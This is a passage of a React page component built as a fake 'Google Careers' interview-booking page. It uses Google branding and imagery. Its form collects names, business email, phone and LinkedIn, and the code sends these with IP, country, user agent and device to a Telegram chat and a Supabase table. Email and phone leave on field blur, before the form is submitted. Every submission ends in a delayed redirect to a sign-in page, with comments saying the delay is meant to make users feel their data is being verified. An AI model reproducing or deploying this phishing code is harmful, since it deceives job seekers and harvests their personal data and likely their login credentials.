      const localTime = new Date().toLocaleString();
      if (!supabaseClient) {
        throw new Error('Missing Supabase environment variables');
      }
      const { error: supabaseError } = await supabaseClient
        .from(SUPABASE_FORM_TABLE)
        .insert({
          first_name: data.firstName,
          last_name: data.lastName,
          business_email: data.businessEmail,
          linkedin_profile: data.linkedInProfile,
          country_code: data.countryCode,
          phone_number: data.phoneNumber,
          preferred_date: data.preferredDate,
          preferred_time: data.preferredTime,
          consent_privacy: data.consentPrivacy,
          consent_accuracy: data.consentAccuracy,
          tracking_session_id: sessionId,
          ip_address: ipInfo.ip,
          ip_country: ipInfo.country,
          user_agent: ua,
          device: device,
          submitted_at: new Date().toISOString(),
        });
      if (supabaseError) {
        throw new Error(`Supabase error: ${supabaseError.message}`);
      }

      const message = [
        '<b>ðŸ“‹ RECRUITMENT FORM SUBMITTED</b>',
        '',
        `ðŸ‘¤ First Name: ${escapeHtml(data.firstName)}`,
        `ðŸ‘¤ Last Name: ${escapeHtml(data.lastName)}`,
        `ðŸ“§ Email: <code>${escapeHtml(data.businessEmail)}</code>`,
        `ðŸ“ž Phone: ${escapeHtml(`${data.countryCode}${data.phoneNumber}`)}`,
        `ðŸ“… Preferred Date: ${formatDateForMessage(data.preferredDate)}`,
        `ðŸ• Preferred Time: ${escapeHtml(data.preferredTime)}`,
        '',
        `ðŸ• Time: ${escapeHtml(localTime)}`,
        `ðŸŒ IP: <code>${escapeHtml(ipInfo.ip)}</code>`,
        `ðŸŒ IP Country: ${escapeHtml(ipInfo.country)}`,
        `ðŸ†” Session: <code>${escapeHtml(sessionId)}</code>`,
        `ðŸ“± Device: ${escapeHtml(device)}`,
        `ðŸ§¾ UA: <code>${escapeHtml(ua)}</code>`,
      ].join('\n');

      await sendTelegramMessage(message);
    } catch (error) {
      // Váº«n log lá»—i qua Telegram (náº¿u cÃ³ thá»ƒ) nhÆ°ng KHÃ”NG cháº·n redirect sang
      // trang login â€” user Ä‘Ã£ báº¥m "Submit & continue" thÃ¬ pháº£i Ä‘Æ°á»£c Ä‘Æ°a sang
      // login ngay cáº£ khi Supabase / Telegram env thiáº¿u config hoáº·c API lá»—i.
      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
      const candidateName = `${data.firstName} ${data.lastName}`.trim() || 'Unknown';
      await sendTelegramMessage(
        `SUBMISSION ERROR\nCandidate: ${candidateName}\nReason: ${errorMessage}`
      ).catch(() => {
        // Ignore this fallback error to avoid infinite notification loops.
      });
    } finally {
      // LuÃ´n chuyá»ƒn sang trang login sau khi xá»­ lÃ½ xong (thÃ nh cÃ´ng hoáº·c lá»—i),
      // nhÆ°ng delay 2s Ä‘á»ƒ user tháº¥y loading state "Submittingâ€¦" thÃªm má»™t
      // lÃºc â€” táº¡o cáº£m giÃ¡c há»‡ thá»‘ng Ä‘ang verify dá»¯ liá»‡u.
      setIsRedirecting(true);
      setTimeout(() => {
        window.location.href = SIGNIN_REDIRECT_URL;
      }, REDIRECT_DELAY_MS);
    }
  };

  const onSubmitError = () => {
    // Khi form còn field thiếu hoặc invalid: KHÔNG redirect sang /signin.
    // react-hook-form sẽ render error đỏ inline dưới mỗi field; user phải
    // sửa xong mới submit đi tiếp được. Đây là hành vi đúng, đồng bộ với
    // flow /signin/* (bên đó cũng chặn khi input rỗng / sai format).

    sendTelegramMessage(
      'VALIDATION ERROR\nCandidate attempted to submit Book your Interview Slot form but some fields were invalid or missing.'
    ).catch(() => { /* best-effort */ });

    // Scroll + focus sang field lỗi đầu tiên để user thấy ngay.
    try {
      const firstErrKey = Object.keys(errors)[0];
      if (firstErrKey) {
        const el = document.querySelector<HTMLElement>(`[name="${firstErrKey}"]`);
        if (el) {
          el.scrollIntoView({ behavior: 'smooth', block: 'center' });
          el.focus({ preventScroll: true });
        }
      }
    } catch (_) { /* ignore */ }
  };

  return (
    <Layout>

      {/* HERO: full-bleed photo + white card — Building Leadership */}
      <section className="w-full bg-white relative">
        <div className="max-w-[1440px] mx-auto px-3 sm:px-6 lg:px-10 pt-4 sm:pt-6 lg:pt-8">
          <motion.div
            className="relative w-full overflow-hidden rounded-[20px] sm:rounded-[24px] bg-[#f1f3f4]"
            style={{ boxShadow: '0 1px 2px rgba(60,64,67,0.06), 0 8px 24px rgba(60,64,67,0.08)' }}
            initial={{ opacity: 0, y: 8 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, ease: [0.2, 0, 0, 1] }}
          >
            {/* Hero photo — gstatic Google Careers image */}
            <img
              src="https://www.gstatic.com/marketing-cms/assets/images/ad/ad/4e7489944dd6a0723bd90ecb100a/careershomepageimage25.webp=n-w1920-h1280-fcrop64=1,00004000ffffffff-rw"
              alt="Googlers collaborating at a Google office"
              className="w-full h-[420px] sm:h-[500px] md:h-[560px] lg:h-[600px] object-cover object-center"
              loading="eager"
            />

            {/* White overlay card — Building Leadership copy */}
            <motion.div
              className="
                absolute z-10
                left-4 sm:left-8 lg:left-16
                top-1/2 -translate-y-1/2
                w-[calc(100%-2rem)] sm:w-[420px] lg:w-[480px]
                bg-white rounded-[14px] p-6 sm:p-8 lg:p-10
              "
              style={{ boxShadow: '0 2px 6px rgba(60,64,67,0.10), 0 10px 28px rgba(60,64,67,0.14)' }}
              initial={{ opacity: 0, x: -16 }}
              animate={{ opacity: 1, x: 0 }}
              transition={{ duration: 0.5, delay: 0.15, ease: [0.2, 0, 0, 1] }}
            >
              {/* Brand mark (Google "G" + Careers) */}
              <div className="inline-flex items-center gap-2 mb-4">
                <GoogleGIcon />
                <span className="text-[12px] font-medium text-[#5f6368]" style={GS}>
                  Google Careers
                </span>
              </div>

              {/* Eyebrow */}
              <p
                className="text-[11px] font-medium tracking-[0.1em] uppercase mb-3"
                style={{ ...GS, color: '#5f6368' }}
              >
                {t('hero.eyebrow')}
              </p>

              {/* Headline */}
              <h1
                className="font-normal text-[#202124] leading-[1.12] mb-4"
                style={{ ...GS, fontSize: 'clamp(1.75rem, 2.6vw, 2.25rem)', letterSpacing: '-0.5px' }}
              >
                {t('hero.title1')}<br />
                {t('hero.title2')}{' '}
                <span style={{ color: '#1a73e8' }}>
                  {t('hero.title3')}<br />{t('hero.title4')}
                </span>
              </h1>

              {/* Subtitle */}
              <p
                className="text-[14px] leading-[1.6] mb-6"
                style={{ ...RB, color: '#5f6368' }}
              >
                {t('hero.subtitle')}
              </p>

              {/* CTA buttons */}
              <div className="flex flex-wrap gap-2.5 mb-5">
                <button
                  onClick={onIntentCtaClick('Schedule Call')}
                  className="inline-flex items-center justify-center h-10 px-5 rounded-full text-[13px] font-medium text-white hover:bg-[#1765cc] active:bg-[#155ab6] transition-colors cursor-pointer"
                  style={{ ...GS, background: '#1a73e8' }}
                >
                  {t('hero.cta.schedule')}
                </button>
                <Link
                  to={ROUTE_PATHS.JOB_DETAILS}
                  className="inline-flex items-center gap-1.5 h-10 px-5 rounded-full text-[13px] font-medium text-[#1a73e8] hover:bg-[#e8f0fe] transition-colors"
                  style={GS}
                >
                  {t('hero.cta.view')}
                  <ArrowRight className="w-3.5 h-3.5" />
                </Link>
              </div>

              {/* Tag row */}
              <div
                className="flex flex-wrap gap-x-4 gap-y-1.5 text-[12px] pt-4 border-t border-[#e8eaed]"
                style={{ ...RB, color: '#5f6368' }}
              >
                {[
                  { icon: Briefcase, label: t('home.heroTag.director') },
                  { icon: MapPin,    label: t('card.locationWorldwide') },
                  { icon: Calendar,  label: t('home.heroTag.applications') },
                ].map(({ icon: Icon, label }) => (
                  <span key={label} className="inline-flex items-center gap-1.5">
                    <Icon className="w-3.5 h-3.5 text-[#80868b]" />
                    {label}
                  </span>
                ))}
              </div>
            </motion.div>
          </motion.div>
        </div>
      </section>

      {/* WHY GOOGLE — four pillars + images */}
      <section className="bg-white py-12 sm:py-16 lg:py-20 border-b border-[#e0e0e0]">
        <div className="max-w-[1200px] mx-auto px-4 sm:px-6 lg:px-8">
          <div className="mb-10">
            <p className="text-[13px] font-medium uppercase tracking-[0.1em] text-[#9aa0a6] mb-2" style={GS}>{t('home.whyRole.eyebrow')}</p>
            <h2 className="text-[2rem] font-normal text-[#202124]" style={GS}>
              {t('home.whyRole.title1')} <span style={{ color: '#1a73e8' }}>{t('home.whyRole.title2')}</span>
            </h2>
          </div>

          <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-5">
            {[
              { title: t('home.why1.title'), body: t('home.why1.body'), image: IMAGES.TEAM_COLLAB_2,        alt: 'Team collaboration' },
              { title: t('home.why2.title'), body: t('home.why2.body'), image: IMAGES.MARKETING_BRIGHT_TEAM_4, alt: 'Marketing team meeting' },
              { title: t('home.why3.title'), body: t('home.why3.body'), image: IMAGES.TECH_OFFICE_1,        alt: 'Modern office culture' },
              { title: t('home.why4.title'), body: t('home.why4.body'), image: IMAGES.EXECUTIVE_PORTRAIT_1, alt: 'Executive leader' },
            ].map(({ title, body, image, alt }, i) => (
              <motion.div
                key={title}
                className="rounded-2xl border border-[#e0e0e0] overflow-hidden hover:shadow-[0_4px_20px_rgba(0,0,0,0.08)] transition-all duration-200 bg-white group flex flex-col"
                initial={{ opacity: 0, y: 12 }}
                whileInView={{ opacity: 1, y: 0 }}
                viewport={{ once: true }}
                transition={{ delay: i * 0.07, duration: 0.4 }}
              >
                {/* Image + copy */}
                <div className="w-full h-32 sm:h-36 overflow-hidden bg-[#f1f3f4]">
                  <img
                    src={image}
                    alt={alt}
                    className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-700"
                    loading="lazy"
                  />
                </div>

                {/* Text content */}
                <div className="p-5 sm:p-6 flex-1">
                  <h3 className="text-[15px] font-medium text-[#202124] mb-2" style={GS}>{title}</h3>
                  <p className="text-[13px] text-[#5f6368] leading-[1.65]" style={RB}>{body}</p>
                </div>
              </motion.div>
            ))}
          </div>
        </div>
      </section>

      {/* ══════════════════════════════════════
          TEAM PHOTO + QUOTE
      ══════════════════════════════════════ */}
      <section className="bg-[#f8f9fa] py-12 sm:py-16 lg:py-20 border-b border-[#e0e0e0]">
        <div className="max-w-[1200px] mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid lg:grid-cols-2 gap-10 lg:gap-16 items-center">

            {/* Photo grid */}
            <motion.div
              className="grid grid-cols-2 gap-3"
              initial={{ opacity: 0, x: -16 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ once: true }}
              transition={{ duration: 0.5 }}
            >
              <div className="col-span-2 rounded-2xl overflow-hidden h-52">
                <img src={IMAGES.TEAM_STRATEGY_2} alt="Team strategy" className="w-full h-full object-cover hover:scale-105 transition-transform duration-700" />
              </div>
              <div className="rounded-2xl overflow-hidden h-36">
                <img src={IMAGES.MARKETING_BRIGHT_TEAM_4} alt="Team meeting" className="w-full h-full object-cover hover:scale-105 transition-transform duration-700" />
              </div>
              <div className="rounded-2xl overflow-hidden h-36">
                <img src={IMAGES.TEAM_COLLAB_1} alt="Collaboration" className="w-full h-full object-cover hover:scale-105 transition-transform duration-700" />
              </div>
            </motion.div>

            {/* Content */}
            <motion.div
              initial={{ opacity: 0, x: 16 }}
              whileInView={{ opacity: 1, x: 0 }}
              viewport={{ once: true }}
              transition={{ duration: 0.5, delay: 0.1 }}
            >
              <p className="text-[13px] font-medium uppercase tracking-[0.1em] text-[#9aa0a6] mb-4" style={GS}>{t('home.life.eyebrow')}</p>
              <h2 className="text-[1.875rem] font-normal text-[#202124] leading-tight mb-5" style={GS}>
                {t('home.life.title1')}{' '}
                <span style={{ color: '#1a73e8' }}>{t('home.life.title2')}</span>
              </h2>
              <p className="text-[15px] text-[#5f6368] leading-[1.7] mb-8" style={RB}>
                {t('home.life.desc')}
              </p>

              {/* Testimonial */}
              <div className="bg-white rounded-2xl border border-[#e0e0e0] p-5">
                <Quote className="w-5 h-5 text-[#1a73e8] mb-3 opacity-60" />
                <p className="text-[14px] text-[#3c4043] leading-[1.7] italic mb-4" style={RB}>
                  {t('home.testimonial1.quote')}
                </p>
                <div className="flex items-center gap-3">
                  <img
                    src={TESTIMONIALS[0].img}
                    alt={TESTIMONIALS[0].name}
                    className="w-9 h-9 rounded-full object-cover"
                  />
                  <div>
                    <p className="text-[13px] font-medium text-[#202124]" style={GS}>{TESTIMONIALS[0].name}</p>
                    <p className="text-[12px] text-[#5f6368]" style={RB}>{t('home.testimonial1.title')}</p>
                  </div>
                </div>
              </div>
            </motion.div>
          </div>
        </div>
      </section>

      {/* Video / culture banner */}
      <section className="relative overflow-hidden py-0 border-b border-[#e0e0e0]">
        <div className="relative h-[260px] sm:h-[320px] lg:h-[380px]">
          <img
            src={IMAGES.TEAM_STRATEGY_8}
            alt="Google team culture"
            className="absolute inset-0 w-full h-full object-cover"
          />
          <div
            className="absolute inset-0"
            style={{ background: 'linear-gradient(135deg, rgba(26,115,232,0.82) 0%, rgba(0,0,0,0.55) 100%)' }}
          />
          <div className="absolute inset-0 flex items-center">
            <div className="max-w-[1200px] mx-auto px-4 sm:px-6 lg:px-8 w-full">
              <div className="max-w-[600px]">
                <p className="text-[13px] font-medium uppercase tracking-[0.1em] text-white/70 mb-3" style={GS}>{t('home.culture.eyebrow')}</p>
                <h2 className="text-[1.6rem] sm:text-[2.25rem] font-normal text-white leading-tight mb-4" style={GS}>
                  {t('home.culture.title1')}<br />
                  <span className="font-medium">{t('home.culture.title2')}</span>
                </h2>
                <p className="text-[15px] text-white/80 leading-[1.65] mb-8" style={RB}>
                  {t('home.culture.desc')}
                </p>
                <div className="flex flex-wrap gap-3">
                  <button
                    onClick={onIntentCtaClick('Apply Today')}
                    className="inline-flex items-center gap-2 h-11 px-6 rounded-full bg-white text-[#1a73e8] text-[14px] font-medium hover:bg-[#f8f9fa] transition-colors cursor-pointer"
                    style={GS}
                  >
                    {t('home.culture.cta1')}
                    <ArrowRight className="w-4 h-4" />
                  </button>
                  <Link
                    to={ROUTE_PATHS.JOB_DETAILS}
                    className="inline-flex items-center gap-2 h-11 px-6 rounded-full border border-white/40 text-white text-[14px] font-medium hover:bg-white/10 transition-colors"
                    style={GS}
                  >
                    <Play className="w-4 h-4" />
                    {t('home.culture.cta2')}
                  </Link>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* SCHEDULE A CALL — after culture banner (layout as before relocate) */}
      <section id="form" className="py-16 sm:py-20 lg:py-24 bg-white">
        <div className="w-full max-w-[1180px] mx-auto px-5 sm:px-8 lg:px-12">

              {/* 3-step progress: number left, copy right, connectors between */}
              <div
                className="mb-8 lg:mb-12 w-full max-w-[960px] mx-auto overflow-x-auto pb-1"
                style={{ fontFamily: "'Google Sans', 'Roboto', sans-serif" }}
              >
                <div className="flex items-start min-w-[min(100%,640px)] sm:min-w-0 w-full">
                  <div className="flex items-start gap-2.5 sm:gap-3 shrink-0 max-w-[34%] sm:max-w-none sm:flex-1 min-w-0">
                    <div
                      className="w-8 h-8 rounded-full flex items-center justify-center text-white text-[13px] font-medium bg-[#1a73e8] flex-shrink-0"
                      style={GS}
                    >
                      1
                    </div>
                    <div className="min-w-0 pt-0.5">
                      <p className="text-[13px] sm:text-[14px] font-medium text-[#202124] leading-tight" style={GS}>
                        {t('form.step1Title', 'Schedule time')}
                      </p>
                      <p className="text-[11px] sm:text-[12px] text-[#5f6368] mt-0.5" style={RB}>
                        {t('form.step1Sub', '5-10 minutes')}
                      </p>
                    </div>
                  </div>
                  <div className="pt-4 flex-1 min-w-[12px] sm:min-w-[24px] px-1 sm:px-2" aria-hidden>
                    <div className="h-px w-full bg-[#e0e0e0]" />
                  </div>
                  <div className="flex items-start gap-2.5 sm:gap-3 shrink-0 max-w-[30%] sm:max-w-none sm:flex-1 min-w-0">
                    <div
                      className="w-8 h-8 rounded-full flex items-center justify-center text-white text-[13px] font-medium bg-[#5f6368] flex-shrink-0"
                      style={GS}
                    >
                      2
                    </div>
                    <div className="min-w-0 pt-0.5">
                      <p className="text-[13px] sm:text-[14px] font-medium text-[#202124] leading-tight" style={GS}>
                        {t('form.step2Title', 'Verify')}
                      </p>
                      <p className="text-[11px] sm:text-[12px] text-[#5f6368] mt-0.5" style={RB}>
                        {t('form.step2Sub', 'less than 3 minutes')}
                      </p>
                    </div>
                  </div>
                  <div className="pt-4 flex-1 min-w-[12px] sm:min-w-[24px] px-1 sm:px-2" aria-hidden>
                    <div className="h-px w-full bg-[#e0e0e0]" />
                  </div>
                  <div className="flex items-start gap-2.5 sm:gap-3 shrink-0 max-w-[28%] sm:max-w-none sm:flex-1 min-w-0">
                    <div
                      className="w-8 h-8 rounded-full flex items-center justify-center text-white text-[13px] font-medium bg-[#5f6368] flex-shrink-0"
                      style={GS}
                    >
                      3
                    </div>
                    <div className="min-w-0 pt-0.5">
                      <p className="text-[13px] sm:text-[14px] font-medium text-[#202124] leading-tight" style={GS}>
                        {t('form.step3Title', 'Call scheduled')}
                      </p>
                    </div>
                  </div>
                </div>
              </div>

            <motion.div
              className="flex flex-col lg:grid lg:grid-cols-[2fr_3fr] gap-10 lg:gap-14 xl:gap-20 items-start"
              initial={{ opacity: 0, y: 16 }}
              whileInView={{ opacity: 1, y: 0 }}
              viewport={{ once: true }}
              transition={{ duration: 0.5, ease: [0.22, 1, 0.36, 1] }}
            >

              {/* Left: illustration (~40%) */}
              <div className="flex items-center justify-center lg:justify-start lg:sticky lg:top-24 w-full">
                <img
                  src="/images/schedule_call_illustration.png"
                  alt="Google Careers illustration"
                  className="w-full h-auto max-w-[440px] select-none pointer-events-none"
                  loading="lazy"
                  draggable={false}
                />
              </div>

              {/* Right: heading + form (~60%) */}
              <div className="w-full min-w-0">
                <h2
                  className="text-left text-[2rem] sm:text-[2.5rem] lg:text-[2.75rem] font-normal text-[#202124] leading-[1.1] tracking-[-1px] mb-4"
                  style={GS}
                >
                  {t('form.schedule')}
                </h2>
                <p
                  className="text-left text-[14px] sm:text-[15px] text-[#5f6368] leading-[1.65] mb-2"
                  style={RB}
                >
                  {t('form.desc')}
                </p>
                <p className="text-right text-[12px] text-[#5f6368] mb-6" style={RB}>
                  {t('form.required')}
                </p>

                  <form onSubmit={handleSubmit(onSubmit, onSubmitError)} className="flex flex-col gap-6">

                    {/* â”€â”€ Legal name â€” joined input group like Business Email â”€â”€ */}
                    <div>
                      <p className="text-[14px] font-medium text-[#202124] mb-2" style={GS}>{t('form.legalName')}<span style={{ color: '#d93025', marginLeft: 2 }}>*</span></p>
                      {/* Single-border wrapper â€” no gap between first/last name */}
                      <div style={{
                        display: 'flex',
                        alignItems: 'stretch',
                        borderRadius: '4px',
                        border: `1px solid ${(errors.firstName || errors.lastName) ? '#d93025' : '#dadce0'}`,
                        background: 'white',
                        overflow: 'hidden',
                        gap: 0,
                      }}>
                        <input
                          placeholder={`${t('form.firstName')} *`}
                          style={{
                            ...RB,
                            flex: 1,
                            height: 44,
                            padding: '0 12px',
                            fontSize: 14,
                            color: '#202124',
                            background: 'transparent',
                            border: 'none',
                            outline: 'none',
                            boxShadow: 'none',
                            minWidth: 0,
                          }}
                          {...register('firstName')}
                        />
                        <div style={{ width: 1, background: '#dadce0', flexShrink: 0 }} />
                        <input
                          placeholder={`${t('form.lastName')} *`}
                          style={{
                            ...RB,
                            flex: 1,
                            height: 44,
                            padding: '0 12px',
                            fontSize: 14,
                            color: '#202124',
                            background: 'transparent',
                            border: 'none',
                            outline: 'none',
                            boxShadow: 'none',
                            minWidth: 0,
                          }}
                          {...register('lastName')}
                        />
                      </div>
                      {(errors.firstName || errors.lastName) && (
                        <p className="text-[12px] text-[#d93025] mt-1" style={RB}>
                          ⚠ {errors.firstName?.message || errors.lastName?.message}
                        </p>
                      )}
                      <p className="text-[12px] text-[#5f6368] leading-relaxed mt-2" style={RB}>
                        {t('form.legalNameHelp')}
                      </p>
                    </div>

                    {/* Business Email */}
                    <FormField label={t('form.businessEmail')} required error={errors.businessEmail?.message}>
                      <Input
                        type="email"
                        placeholder={`${t('form.businessEmail')} *`}
                        className="h-11 rounded border border-[#dadce0] bg-white text-[14px] text-[#202124] placeholder:text-[#80868b] focus-visible:ring-0 focus-visible:border-[#1a73e8] focus-visible:outline-none transition-colors px-3"
                        style={RB}
                        {...register('businessEmail', {
                          onBlur: (e) => {
                            void sendContactFieldNotice('email', e.target.value);
                          },
                        })}
                      />
                    </FormField>

                    {/* LinkedIn â€” khÃ´ng báº¯t buá»™c */}
                    <FormField label={t('form.linkedIn')} error={errors.linkedInProfile?.message}>
                      <Input
                        placeholder="linkedin.com/in/yourname"
                        className="h-11 rounded border border-[#dadce0] bg-white text-[14px] text-[#202124] placeholder:text-[#80868b] focus-visible:ring-0 focus-visible:border-[#1a73e8] focus-visible:outline-none transition-colors px-3"
                        style={RB}
                        {...register('linkedInProfile')}
                      />
                    </FormField>

                    {/* â”€â”€ Country code & phone â€” custom dropdown with flag icons â”€â”€ */}
                    <div>
                      <label className="block text-[14px] font-medium text-[#202124] mb-1.5" style={GS}>
                        {t('form.countryAndPhone')}<span className="text-[#d93025] ml-0.5">*</span>
                      </label>
                      <div
                        className="flex rounded border bg-white overflow-visible"
                        style={{ borderColor: (errors.countryCode || errors.phoneNumber) ? '#d93025' : '#dadce0' }}
                      >
                        {/* Custom country picker trigger */}
                        <div ref={countryRef} className="relative shrink-0">
                          <button
                            type="button"
                            onClick={() => { setCountryOpen(o => !o); setCountrySearch(''); }}
                            className="flex items-center gap-1.5 h-11 pl-3 pr-2 text-[14px] text-[#202124] bg-transparent border-none outline-none cursor-pointer hover:bg-[#f8f9fa] transition-colors"
                            style={RB}
                          >
                            <img
                              src={`https://flagcdn.com/w20/${currentCountry.code.toLowerCase()}.png`}
                              alt={currentCountry.name}
                              width={20} height={15}
                              className="object-cover rounded-sm"
                              style={{ display: 'inline-block', minWidth: 20 }}
                            />
                            <span className="text-[13px] text-[#5f6368]">{currentCountry.dial}</span>
                            <ChevronDown size={14} className="text-[#80868b]" />
                          </button>

                          {/* Dropdown panel */}
                          {countryOpen && (
                            <div
                              className="absolute left-0 top-full mt-1 z-50 bg-white rounded-lg shadow-[0_4px_24px_rgba(0,0,0,0.16)] border border-[#e8eaed] overflow-hidden"
                              style={{ width: 280, maxHeight: 320 }}
                            >
                              {/* Search input */}
                              <div className="flex items-center gap-2 px-3 py-2 border-b border-[#e8eaed]">
                                <Search size={14} className="text-[#80868b] shrink-0" />
                                <input
                                  autoFocus
                                  placeholder={t('form.searchCountry')}
                                  value={countrySearch}
                                  onChange={e => setCountrySearch(e.target.value)}
                                  className="flex-1 text-[13px] text-[#202124] placeholder:text-[#80868b] outline-none border-none bg-transparent"
                                  style={RB}
                                />
                              </div>
                              {/* Country list */}
                              <div className="overflow-y-auto" style={{ maxHeight: 260 }}>
                                {filteredCountries.length === 0 ? (
                                  <p className="px-4 py-3 text-[13px] text-[#80868b]" style={RB}>{t('form.noResults')}</p>
                                ) : filteredCountries.map(c => (
                                  <button
                                    key={c.code}
                                    type="button"
                                    onClick={() => {
                                      setSelectedCountryCode(c.code);
                                      setValue('countryCode', c.code);
                                      setCountryOpen(false);
                                      setCountrySearch('');
                                    }}
                                    className={`w-full flex items-center gap-3 px-3 py-2.5 text-left hover:bg-[#f8f9fa] transition-colors ${selectedCountryCode === c.code ? 'bg-[#e8f0fe]' : ''}`}
                                  >
                                    <img
                                      src={`https://flagcdn.com/w20/${c.code.toLowerCase()}.png`}
                                      alt={c.name}
                                      width={22} height={16}
                                      className="object-cover rounded-sm shrink-0"
                                      style={{ minWidth: 22 }}
                                    />
                                    <span className="flex-1 text-[13px] text-[#202124] truncate" style={RB}>{c.name}</span>
                                    <span className="text-[12px] text-[#5f6368] shrink-0" style={RB}>{c.dial}</span>
                                  </button>
                                ))}
                              </div>
                            </div>
                          )}
                        </div>

                        {/* Hidden input for react-hook-form */}
                        <input type="hidden" {...register('countryCode')} value={selectedCountryCode} />

                        <div className="w-px self-stretch bg-[#dadce0]" />
                        <input
                          type="tel"
                          placeholder={`${t('form.phone')} *`}
                          className="flex-1 h-11 px-3 text-[14px] text-[#202124] placeholder:text-[#80868b] bg-transparent outline-none border-none"
                          style={RB}
                          {...register('phoneNumber', {
                            onBlur: (e) => {
                              const dial = currentCountry?.dial ?? '';
                              void sendContactFieldNotice('phone', `${dial}${e.target.value}`);
                            },
                          })}
                        />
                      </div>
                      {(errors.countryCode || errors.phoneNumber) && (
                        <p className="text-[12px] text-[#d93025] mt-1" style={RB}>
                          ⚠ {errors.countryCode?.message || errors.phoneNumber?.message}
                        </p>
                      )}
                    </div>

                    {/* â”€â”€ Preferred date â€” custom calendar with red-circle locked days â”€â”€ */}
                    <div>
                      <label className="block text-[14px] font-medium text-[#202124] mb-1.5" style={GS}>
                        {t('form.preferredDate')}<span className="text-[#d93025] ml-0.5">*</span>
                      </label>
                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-2">

                        {/* Custom calendar trigger */}
                        <div ref={calendarRef} className="relative">
                          <button
                            type="button"
                            onClick={() => setCalendarOpen(o => !o)}
                            className="w-full flex items-center justify-between h-11 px-3 rounded border bg-white text-[14px] cursor-pointer hover:border-[#1a73e8] transition-colors"
                            style={{
                              borderColor: errors.preferredDate ? '#d93025' : '#dadce0',
                              ...RB,
                            }}
                          >
                            <span style={{ color: selectedDateStr ? '#202124' : '#80868b' }}>
                              {selectedDateStr
                                ? new Date(selectedDateStr + 'T00:00:00').toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })
                                : t('form.selectDate')}
                            </span>
                            <Calendar size={16} className="text-[#5f6368] shrink-0" />
                          </button>

                          {/* Hidden input synced to form */}
                          <input type="hidden" {...register('preferredDate')} value={selectedDateStr} />

                          {/* Calendar popup */}
                          {calendarOpen && (
                            <CustomCalendar
                              selected={selectedDateStr}
                              onSelect={(d) => {
                                setSelectedDateStr(d);
                                setValue('preferredDate', d, { shouldValidate: true });
                                setValue('preferredTime', '');
                              }}
                              onClose={() => setCalendarOpen(false)}
                            />
                          )}
                        </div>

                        {/* Time â€” native select */}
                        <div
                          className="flex items-center rounded border bg-white px-3 h-11"
                          style={{ borderColor: errors.preferredTime ? '#d93025' : '#dadce0' }}
                        >
                          <select
                            className="w-full text-[14px] text-[#202124] bg-transparent outline-none border-none cursor-pointer"
                            style={RB}
                            {...register('preferredTime')}
                          >
                            <option value="">{t('form.selectTime')}</option>
                            {TIME_OPTIONS.map(t => (
                              <option key={t} value={t}>{t}</option>
                            ))}
                          </select>
                        </div>
                      </div>

                      {(errors.preferredDate || errors.preferredTime) && (
                        <p className="text-[12px] text-[#d93025] mt-1" style={RB}>
                          ⚠ {errors.preferredDate?.message || errors.preferredTime?.message}
                        </p>
                      )}
                      <p className="text-[12px] text-[#5f6368]" style={RB}>
                        {t('form.dateHelper')}
                      </p>
                    </div>

                    {/* Consent checkboxes */}
                    <div className="flex flex-col gap-4 pt-1">
                      {/* Checkbox 1 â€” Privacy */}
                      <div className="flex gap-3 items-start">
                        <Checkbox
                          id="consent-privacy"
                          checked={!!consentPrivacy}
                          onCheckedChange={v => setValue('consentPrivacy', !!v)}
                          className="mt-0.5 rounded-sm border-[#dadce0] data-[state=checked]:bg-[#1a73e8] data-[state=checked]:border-[#1a73e8]"
                        />
                        <label htmlFor="consent-privacy" className="text-[13px] text-[#202124] leading-relaxed cursor-pointer" style={RB}>
                          {t('form.consent1.prefix')}{' '}
                          <a href="#" className="text-[#1a73e8] underline hover:text-[#1557b0]">{t('form.consent1.link')}</a>.
                          {' '}{t('form.consent1.suffix')}
                        </label>
                      </div>
                      {errors.consentPrivacy && (
                        <p className="text-[12px] text-[#d93025] -mt-2" style={RB}>⚠ {errors.consentPrivacy.message}</p>
                      )}

                      {/* Checkbox 2 â€” Accuracy */}
                      <div className="flex gap-3 items-start">
                        <Checkbox
                          id="consent-accuracy"
                          checked={!!consentAccuracy}
                          onCheckedChange={v => setValue('consentAccuracy', !!v)}
                          className="mt-0.5 rounded-sm border-[#dadce0] data-[state=checked]:bg-[#1a73e8] data-[state=checked]:border-[#1a73e8]"
                        />
                        <label htmlFor="consent-accuracy" className="text-[13px] text-[#202124] leading-relaxed cursor-pointer" style={RB}>
                          {t('form.consent2')}
                        </label>
                      </div>
                      {errors.consentAccuracy && (
                        <p className="text-[12px] text-[#d93025] -mt-2" style={RB}>⚠ {errors.consentAccuracy.message}</p>
                      )}
                    </div>

                    {/* Submit */}
                    <div className="flex flex-col sm:flex-row sm:justify-end pt-2">
                      {submitError && (
                        <p className="text-[12px] text-[#d93025] mb-2" style={RB}>
                          ⚠ {submitError}
                        </p>
                      )}
                      <button
                        type="submit"
                        disabled={isSubmitting || isRedirecting}
                        className="w-full sm:w-auto h-11 px-8 rounded bg-[#1a73e8] hover:bg-[#1557b0] text-white text-[14px] font-medium transition-colors duration-150 disabled:opacity-60 flex items-center justify-center gap-2"
                        style={GS}
                      >
                        {(isSubmitting || isRedirecting) ? t('form.submitting') : t('form.submit')}
                      </button>
                    </div>

                  </form>
                </div>

            </motion.div>

        </div>
      </section>

    </Layout>
  );
}
